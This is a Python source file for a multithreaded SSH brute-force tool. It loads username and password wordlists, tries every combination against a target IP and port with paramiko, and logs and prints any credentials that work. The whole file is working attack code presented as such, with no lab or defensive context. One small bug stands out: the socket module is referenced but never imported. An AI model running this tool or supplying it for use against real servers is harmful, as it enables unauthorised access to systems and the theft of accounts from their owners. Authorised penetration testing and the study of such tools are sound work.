import threading  # Library to handle multithreading operations
import paramiko  # Library to interact with SSH protocol
import os  # Library for file operations and system interactions
import sys  # Library for handling command-line arguments and exiting the program
import time  # Library for handling time delays and timestamps
import logging  # Library to enable logging for debugging and tracking
from concurrent.futures import ThreadPoolExecutor  # Thread pool for managing multithreading efficiently

# Generate a timestamp to include in the log file name for uniqueness
timestamp = time.strftime("%Y%m%d-%H%M%S")  # Current date and time formatted as YearMonthDay-HourMinuteSecond
log_filename = f"ssh_brute_force_{timestamp}.log"  # Dynamic log file name with timestamp

# Configure logging to write logs to a file with timestamps and severity levels
logging.basicConfig(
    filename=log_filename,  # File to store logs
    level=logging.INFO,  # Log only messages of INFO level or higher
    format='%(asctime)s - %(levelname)s - %(message)s'  # Log format: timestamp, severity level, and message
)

# Function to load usernames and passwords from input files
def load_credentials(username_file, password_file):
    """
    Load usernames and passwords from the specified files.
    Args:
        username_file (str): Path to the username file.
        password_file (str): Path to the password file.
    Returns:
        tuple: A tuple containing two lists - usernames and passwords.
    """
    try:
        # Open the username file and read all lines, stripping whitespace
        with open(username_file, 'r') as uf:
            usernames = [line.strip() for line in uf.readlines() if line.strip()]
        # Open the password file and read all lines, stripping whitespace
        with open(password_file, 'r') as pf:
            passwords = [line.strip() for line in pf.readlines() if line.strip()]
        return usernames, passwords  # Return the two lists
    except FileNotFoundError as e:
        # Log the error and terminate the program if files are not found
        logging.error(f"File not found: {e}")
        sys.exit(1)  # Exit the program with a non-zero status code

# Class to perform the SSH brute-force attack
class SSHBruteForcer:
    def __init__(self, target_ip, port, usernames, passwords):
        """
        Initialize the SSH brute-forcing parameters.
        Args:
            target_ip (str): IP address of the target server.
            port (int): SSH port to connect to.
            usernames (list): List of usernames to test.
            passwords (list): List of passwords to test.
        """
        self.target_ip = target_ip  # Target SSH server IP address
        self.port = port  # SSH port number
        self.usernames = usernames  # List of usernames
        self.passwords = passwords  # List of passwords
        self.lock = threading.Lock()  # Lock to ensure thread-safe operations when logging
        self.success = False  # Flag to stop the attack when credentials are successful

    # Function to attempt SSH login for a single username-password pair
    def attempt_login(self, username, password):
        """
        Attempt to log in to the target SSH server using a username and password.
        Args:
            username (str): The username to test.
            password (str): The password to test.
        """
        # If successful login is already achieved, stop further attempts
        if self.success:
            return

        # Initialize the SSH client for a single connection attempt
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically accept host keys
        
        try:
            # Log the current login attempt
            logging.info(f"Trying Username: {username} Password: {password}")
            # Attempt to connect to the SSH server with the provided credentials
            client.connect(self.target_ip, port=self.port, username=username, password=password, timeout=5)
            with self.lock:  # Acquire lock to safely log success
                logging.info(f"[SUCCESS] Username: {username} Password: {password}")
                print(f"[SUCCESS] Username: {username} Password: {password}")
                self.success = True  # Set success flag to True
        except paramiko.AuthenticationException:
            # Log failed login attempts due to incorrect credentials
            with self.lock:
                logging.warning(f"[FAILED] Username: {username} Password: {password}")
        except (paramiko.SSHException, socket.timeout) as e:
            # Log other errors like connection timeouts or SSH-related issues
            logging.error(f"[ERROR] Network issue: {e}")
        finally:
            client.close()  # Ensure the SSH client is closed after each attempt
            time.sleep(0.1)  # Short delay to avoid overwhelming the SSH server

    # Function to start the brute-force attack using multithreading
    def start_attack(self, max_threads=5):
        """
        Launch a multi-threaded brute-force attack using ThreadPoolExecutor.
        Args:
            max_threads (int): Maximum number of concurrent threads.
        """
        with ThreadPoolExecutor(max_threads) as executor:
            # Iterate through all username and password combinations
            for username in self.usernames:
                for password in self.passwords:
                    # Stop creating tasks if login has already succeeded
                    if self.success:
                        return
                    # Submit the login attempt as a task to the thread pool
                    executor.submit(self.attempt_login, username, password)

# Main function to execute the SSH brute-force tool
def main():
    """
    Main function to validate inputs and initiate the SSH brute-force attack.
    """
    # Ensure the program receives exactly 4 arguments
    if len(sys.argv) != 5:
        print("Usage: python ssh_brute_force.py <target_ip> <port> <username_file> <password_file>")
        logging.error("Incorrect number of arguments provided.")
        sys.exit(1)

    # Parse command-line arguments
    target_ip = sys.argv[1]  # Target IP address
    try:
        port = int(sys.argv[2])  # Convert the port argument to an integer
    except ValueError:
        logging.error("Port must be an integer.")  # Log an error if port conversion fails
        print("Port must be an integer.")
        sys.exit(1)

    # Load usernames and passwords from the specified files
    username_file = sys.argv[3]
    password_file = sys.argv[4]
    usernames, passwords = load_credentials(username_file, password_file)

    # Create an instance of the brute-force class and start the attack
    brute_forcer = SSHBruteForcer(target_ip, port, usernames, passwords)
    brute_forcer.start_attack(max_threads=10)  # Launch attack with 10 concurrent threads

    # If no credentials were found, log and print the result
    if not brute_forcer.success:
        logging.info("No valid credentials found.")
        print("No valid credentials found. Check logs for details.")

# Entry point of the program
if __name__ == "__main__":
    main()
